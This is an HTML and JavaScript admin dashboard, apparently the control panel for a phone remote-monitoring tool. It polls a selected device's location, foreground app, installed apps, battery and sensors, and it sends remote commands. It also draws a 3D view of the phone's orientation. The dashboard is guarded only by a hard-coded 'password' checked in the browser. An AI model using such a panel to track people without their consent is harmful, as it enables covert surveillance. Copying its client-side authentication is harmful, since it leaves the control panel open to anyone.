<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { max-width: 500px; width: 100%; padding: 30px; background: white; border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); text-align: center; }
        h2 { margin-bottom: 25px; color: #333; }
        select, input, button { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ccc; box-sizing: border-box; font-size: 16px; }
        button { background-color: #007bff; color: white; cursor: pointer; border: none; transition: background-color 0.2s; }
        button:hover { background-color: #0056b3; }
        button:disabled { background-color: #6c757d; cursor: not-allowed; }
        .status-log { margin-top: 20px; padding: 12px; border-radius: 6px; word-wrap: break-word; text-align: left; font-weight: 500; }
        .log-info { background-color: #e9ecef; color: #495057; }
        .log-success { background-color: #d4edda; color: #155724; }
        .log-error { background-color: #f8d7da; color: #721c24; }
        .data-panel { margin-top: 20px; text-align: left; background: #fafafa; padding: 15px; border-radius: 8px; border: 1px solid #e0e0e0; }
        .data-item { display: flex; justify-content: space-between; padding: 5px 0; border-bottom: 1px solid #eee; }
        .data-item:last-child { border-bottom: none; }
        .data-label { font-weight: 600; color: #555; }
        .data-value { color: #222; max-width: 70%; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; }
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); align-items: center; justify-content: center; }
        .modal-content { background-color: #fff; padding: 20px; border-radius: 10px; text-align: left; max-height: 80%; width: 90%; max-width: 450px; overflow-y: auto; }
        .modal-content h3 { text-align: center; margin-top: 0; }
        .app-item { padding: 4px; font-size: 14px; border-bottom: 1px solid #eee; }
        .button-group { display: flex; gap: 10px; }
        #visualizer { width: 300px; height: 300px; margin: 10px auto; background-color: #f0f0f0; border-radius: 8px; cursor: grab; }
        #visualizer:active { cursor: grabbing; }
        #heading-info { text-align: center; font-weight: 600; color: #333; margin-top: 10px; }
    </style>
</head>
<body>

    <!-- **NEW: Hidden div to store SVG assets** -->
    <div id="svg-assets" style="display: none;">
        <svg id="compass-svg" width="256" height="256" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
            <circle cx="50" cy="50" r="48" fill="rgba(255,255,255,0.75)" stroke="#555" stroke-width="1.5"/>
            <polygon points="50,15 55,25 45,25" fill="#e63946"/>
            <text x="50" y="12" font-family="sans-serif" font-size="10" fill="#e63946" font-weight="bold" text-anchor="middle">N</text>
            <text x="50" y="94" font-family="sans-serif" font-size="8" fill="#333" text-anchor="middle">S</text>
            <text x="6" y="53" font-family="sans-serif" font-size="8" fill="#333" text-anchor="middle">W</text>
            <text x="94" y="53" font-family="sans-serif" font-size="8" fill="#333" text-anchor="middle">E</text>
            <line x1="50" y1="90" x2="50" y2="84" stroke="#555" stroke-width="1"/>
            <line x1="10" y1="50" x2="16" y2="50" stroke="#555" stroke-width="1"/>
            <line x1="90" y1="50" x2="84" y2="50" stroke="#555" stroke-width="1"/>
        </svg>
    </div>

    <div class="container">
        <!-- The rest of your dashboard HTML remains the same -->
        <div id="password-view"><h2>Enter Password</h2><input type="password" id="ui-password-input" placeholder="UI Password" onkeyup="if(event.key === 'Enter') checkUiPassword();"><button onclick="checkUiPassword()">Unlock</button></div>
        <div id="admin-panel-view" style="display: none;"><h2>Admin Dashboard</h2><select id="device-dropdown" onchange="startPolling()"><option value="">-- Loading Devices --</option></select><select id="action-dropdown"><option value="">-- Loading Commands --</option></select><input type="password" id="backend-password" placeholder="Backend API Password"><button id="send-button" onclick="sendCommand()">Send Command</button><div id="status-log" class="status-log log-info">Awaiting command...</div><div class="data-panel"><div class="data-item"><span class="data-label">Screen:</span> <span id="data-screen" class="data-value">--</span></div><div class="data-item"><span class="data-label">Battery:</span> <span id="data-battery" class="data-value">--</span></div><div class="data-item"><span class="data-label">Location:</span> <span id="data-location" class="data-value">--</span></div><div class="data-item"><span class="data-label">Current App:</span> <span id="data-current-app" class="data-value">--</span></div><div class="data-item"><span class="data-label">Accelerometer:</span> <span id="data-accelerometer" class="data-value">--</span></div><div class="data-item"><span class="data-label">Gyroscope:</span> <span id="data-gyroscope" class="data-value">--</span></div><div class="data-item"><span class="data-label">Compass:</span> <span id="data-magnetometer" class="data-value">--</span></div><div class="data-item"><span class="data-label">Proximity:</span> <span id="data-proximity" class="data-value">--</span></div></div><div class="button-group"><button id="refresh-btn" onclick="forceRefresh()">Refresh Data</button><button id="visualize-btn" onclick="showModal('visualizer-modal')" disabled>Visualize Orientation</button></div></div>
    </div>
    <div id="app-list-modal" class="modal" onclick="hideModal('app-list-modal')"><div class="modal-content" onclick="event.stopPropagation()"><h3>Installed Applications</h3><div id="app-list-container"></div></div></div>
    <div id="visualizer-modal" class="modal" onclick="hideModal('visualizer-modal')"><div class="modal-content" onclick="event.stopPropagation()"><h3>Device Orientation</h3><div id="visualizer"></div><div id="heading-info">Heading: --</div><p style="text-align:center; font-size:12px; margin-top: 15px;">Click and drag to rotate view. Scroll to zoom.<br>Click anywhere outside to close.</p></div></div>

    <script>
        const UI_UNLOCK_PASSWORD = "password";
        const COMMANDS_JSON_URL = "https://raw.githubusercontent.com/Jasim9085/Raw-Files/main/commands.json";
        const DEVICES_JSON_URL = "https://raw.githubusercontent.com/Jasim9085/Raw-Files/main/devices.json";
        let dataPollInterval;

        // --- 3D Visualizer & Sensor Fusion ---
        let scene, camera, renderer, controls, phoneModel;
        let animationFrameId;
        let fusedQuaternion = new THREE.Quaternion();
        let isFusionInitialized = false;
        const GYRO_WEIGHT = 0.98;

        function initVisualizer() {
            const visualizerElement = document.getElementById('visualizer');
            if (!visualizerElement) return;

            scene = new THREE.Scene();
            scene.background = new THREE.Color(0xddeeff);

            camera = new THREE.PerspectiveCamera(50, visualizerElement.clientWidth / visualizerElement.clientHeight, 0.1, 1000);
            camera.position.set(0, 3, 6);

            renderer = new THREE.WebGLRenderer({ antialias: true });
            renderer.setSize(visualizerElement.clientWidth, visualizerElement.clientHeight);
            visualizerElement.innerHTML = '';
            visualizerElement.appendChild(renderer.domElement);

            scene.add(new THREE.AmbientLight(0xffffff, 0.4));
            const hemiLight = new THREE.HemisphereLight(0xffffff, 0x444444, 0.8);
            hemiLight.position.set(0, 20, 0);
            scene.add(hemiLight);

            controls = new THREE.OrbitControls(camera, renderer.domElement);
            controls.enableDamping = true;

            // **FIX: Use the embedded SVG as the compass texture**
            const floorMaterial = new THREE.MeshPhongMaterial({ transparent: true });
            const compassSVGElement = document.getElementById('compass-svg');
            const svgString = new XMLSerializer().serializeToString(compassSVGElement);
            const svgDataUrl = "data:image/svg+xml;base64," + window.btoa(svgString);
            
            const textureLoader = new THREE.TextureLoader();
            textureLoader.load(svgDataUrl,
                (texture) => {
                    floorMaterial.map = texture;
                    floorMaterial.needsUpdate = true;
                },
                undefined,
                (err) => { // Fallback if something goes wrong with SVG rendering
                    console.error('SVG compass texture failed. Falling back to plain color.');
                    floorMaterial.color.set(0xcccccc);
                    floorMaterial.opacity = 0.5;
                }
            );

            const floorGeometry = new THREE.CircleGeometry(4, 32);
            const floor = new THREE.Mesh(floorGeometry, floorMaterial);
            floor.rotation.x = -Math.PI / 2;
            scene.add(floor);
            
            phoneModel = new THREE.Group();
            const bodyGeometry = new THREE.BoxGeometry(1.5, 3, 0.2);
            const bodyMaterial = new THREE.MeshStandardMaterial({ color: 0x282828, metalness: 0.5, roughness: 0.6 });
            const phoneBody = new THREE.Mesh(bodyGeometry, bodyMaterial);
            
            const screenGeometry = new THREE.BoxGeometry(1.35, 2.8, 0.05);
            const screenMaterial = new THREE.MeshBasicMaterial({ color: 0x0a0a0a });
            const phoneScreen = new THREE.Mesh(screenGeometry, screenMaterial);
            phoneScreen.position.z = 0.11;

            phoneModel.add(phoneBody, phoneScreen);
            scene.add(phoneModel);

            startAnimationLoop();
        }

        function startAnimationLoop() {
            if (animationFrameId) cancelAnimationFrame(animationFrameId);
            const animate = () => {
                animationFrameId = requestAnimationFrame(animate);
                controls.update();
                renderer.render(scene, camera);
            };
            animate();
        }

        function stopAnimationLoop() {
            if (animationFrameId) {
                cancelAnimationFrame(animationFrameId);
                animationFrameId = null;
            }
        }
        
        function getQuaternionFromAccelMag(accel, mag) {
            const G = new THREE.Vector3(accel.x, accel.y, accel.z).normalize();
            const M = new THREE.Vector3(mag.x, mag.y, mag.z).normalize();
            
            const E = M.clone().cross(G).normalize();
            if(E.lengthSq() < 0.1) return null;

            const N = G.clone().cross(E).normalize();
            
            const orientationMatrix = new THREE.Matrix4().makeBasis(E, N, G);
            const quat = new THREE.Quaternion().setFromRotationMatrix(orientationMatrix);
            
            const correction = new THREE.Quaternion().setFromAxisAngle(new THREE.Vector3(1,0,0), -Math.PI / 2);
            quat.premultiply(correction);

            return quat;
        }

        function updateFusedOrientation(accel, gyro, mag, dt) {
            const accelMagQuat = getQuaternionFromAccelMag(accel, mag);
            
            if (!isFusionInitialized && accelMagQuat) {
                fusedQuaternion.copy(accelMagQuat);
                isFusionInitialized = true;
            } else if (isFusionInitialized) {
                const gyroDeltaQuat = new THREE.Quaternion();
                const axis = new THREE.Vector3(gyro.x, gyro.y, gyro.z).normalize();
                const angle = new THREE.Vector3(gyro.x, gyro.y, gyro.z).length() * dt;
                gyroDeltaQuat.setFromAxisAngle(axis, angle);
                
                fusedQuaternion.multiply(gyroDeltaQuat);
                
                if (accelMagQuat) {
                    fusedQuaternion.slerp(accelMagQuat, 1 - GYRO_WEIGHT);
                }
            }
            phoneModel.quaternion.copy(fusedQuaternion);
        }

        // --- All Original Functions Fully Restored ---

        window.onload = () => { if (sessionStorage.getItem('isAuthenticated') === 'true') showAdminPanel(); };
        function checkUiPassword() { if (document.getElementById('ui-password-input').value === UI_UNLOCK_PASSWORD) { sessionStorage.setItem('isAuthenticated', 'true'); showAdminPanel(); } else { alert('Wrong UI Password!'); } }
        function showAdminPanel() { document.getElementById('password-view').style.display = 'none'; document.getElementById('admin-panel-view').style.display = 'block'; populateDropdown('device-dropdown', DEVICES_JSON_URL, 'Device'); populateDropdown('action-dropdown', COMMANDS_JSON_URL, 'Command'); }
        async function populateDropdown(id, url, type) { const d = document.getElementById(id); try { const r = await fetch(url), i = await r.json(); d.innerHTML = ''; d.add(new Option(`-- Select a ${type} --`, "")); i.forEach(t => d.add(new Option(t.name, t.id || t.value, !1, t.disabled))) } catch (e) { d.innerHTML = `<option value="">-- Error Loading ${type} --</option>` } }
        function showModal(id) { document.getElementById(id).style.display = 'flex'; if (id === 'visualizer-modal' && !animationFrameId) { if (typeof THREE !== 'undefined' && typeof THREE.OrbitControls !== 'undefined') { initVisualizer(); } else { document.getElementById('visualizer').innerHTML = '<p style="color: red; text-align: center; padding-top: 50px;">Error: 3D library failed to load.</p>'; } } }
        function hideModal(id) { if (id === 'visualizer-modal') stopAnimationLoop(); document.getElementById(id).style.display = 'none'; }
        
        function startPolling() {
            const deviceId = document.getElementById('device-dropdown').value;
            if (dataPollInterval) { clearInterval(dataPollInterval); isFusionInitialized = false; }
            if (deviceId) {
                forceRefresh();
                let lastTimestamp = 0;
                dataPollInterval = setInterval(async () => {
                    const now = Date.now();
                    const dt = lastTimestamp ? (now - lastTimestamp) / 1000.0 : 0.05;
                    lastTimestamp = now;
                    await fetchLatestData(dt);
                }, 5000);
            }
        }
        
        async function forceRefresh() {
            const refreshBtn = document.getElementById('refresh-btn');
            refreshBtn.disabled = true;
            refreshBtn.textContent = 'Refreshing...';
            isFusionInitialized = false;
            await fetchLatestData(0.05);
            refreshBtn.disabled = false;
            refreshBtn.textContent = 'Refresh Data';
        }

        async function fetchLatestData(dt) {
            const deviceId = document.getElementById('device-dropdown').value;
            if (!deviceId) return;
            try {
                const res = await fetch(`/.netlify/functions/get-status?deviceId=${deviceId}`);
                if (!res.ok) throw new Error(`Server responded with status: ${res.status}`);
                const data = await res.json();
                parseAndDisplayData(data, false, dt);
            } catch (e) { console.error("Could not fetch data:", e); }
        }

        function parseAndDisplayData(data, isManualTrigger, dt) {
            let accel = {}, gyro = {}, mag = {};
            for (const dataType in data) {
                const payload = data[dataType].payload;
                switch(dataType) {
                    case "screen_status": document.getElementById('data-screen').textContent = payload; break;
                    case "battery_status": if (payload?.percentage !== undefined) document.getElementById('data-battery').textContent = `${payload.percentage.toFixed(0)}% (${payload.isCharging ? "Yes" : "No"})`; break;
                    case "location": if (payload?.latitude) document.getElementById('data-location').textContent = `${payload.latitude.toFixed(4)}, ${payload.longitude.toFixed(4)}`; else document.getElementById('data-location').textContent = payload || 'N/A'; break;
                    case "current_app": document.getElementById('data-current-app').textContent = payload || 'N/A'; break;
                    case "proximity": if (payload?.distance !== undefined) document.getElementById('data-proximity').textContent = `${payload.distance} cm`; break;
                    case "installed_apps": if (isManualTrigger) { const c = document.getElementById('app-list-container'); c.innerHTML = ''; if (typeof payload === 'object') { for (const p in payload) { const a = payload[p], d = document.createElement('div'); d.className = 'app-item'; d.textContent = `${a} (${p})`; c.appendChild(d); } } showModal('app-list-modal'); } break;
                    case "accelerometer": case "gyroscope": case "magnetometer_compass": if (payload?.x !== undefined) { const e = `data-${dataType.replace('_compass','')}`; document.getElementById(e).textContent = `X:${payload.x.toFixed(2)} Y:${payload.y.toFixed(2)} Z:${payload.z.toFixed(2)}`; document.getElementById('visualize-btn').disabled = false; if (dataType === "accelerometer") accel = payload; if (dataType === "gyroscope") gyro = { x: THREE.MathUtils.degToRad(payload.x), y: THREE.MathUtils.degToRad(payload.y), z: THREE.MathUtils.degToRad(payload.z) }; if (dataType === "magnetometer_compass") mag = payload; } break;
                }
            }
            if (animationFrameId && accel.x !== undefined && gyro.x !== undefined && mag.x !== undefined) {
                updateFusedOrientation(accel, gyro, mag, dt);
                const euler = new THREE.Euler().setFromQuaternion(fusedQuaternion, 'YXZ');
                let heading = THREE.MathUtils.radToDeg(euler.y);
                if (heading < 0) heading += 360;
                const directions = ["N", "NE", "E", "SE", "S", "SW", "W", "NW"];
                const dirIndex = Math.round(heading / 45) % 8;
                document.getElementById('heading-info').textContent = `Heading: ${heading.toFixed(0)}° ${directions[dirIndex]}`;
            }
        }

        async function sendCommand() {
            const deviceId = document.getElementById('device-dropdown').value, action = document.getElementById('action-dropdown').value, password = document.getElementById('backend-password').value, logDiv = document.getElementById('status-log'), sendButton = document.getElementById('send-button');
            if (!deviceId || !action || !password) { logDiv.className = 'status-log log-error'; logDiv.textContent = 'Error: All fields are required.'; return; }
            sendButton.disabled = true; sendButton.textContent = 'Sending...'; logDiv.className = 'status-log log-info'; logDiv.textContent = `Sending '${action}' command...`;
            try {
                const res = await fetch('/.netlify/functions/send-command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action, password }) });
                const result = await res.json();
                if (res.ok) {
                    logDiv.className = 'status-log log-success'; logDiv.textContent = `✅ Success: ${result.message}`;
                    if (action.startsWith('get_') || action === 'list_apps') { logDiv.textContent += ' Refreshing data...'; setTimeout(() => { forceRefresh(); }, 1500); }
                } else { logDiv.className = 'status-log log-error'; logDiv.textContent = `❌ Error: ${result.error || 'Unknown server error'}`; }
            } catch (error) { logDiv.className = 'status-log log-error'; logDiv.textContent = '❌ Network Error: Could not reach the command function.'; } 
            finally { sendButton.disabled = false; sendButton.textContent = 'Send Command'; }
        }
    </script>
</body>
</html>
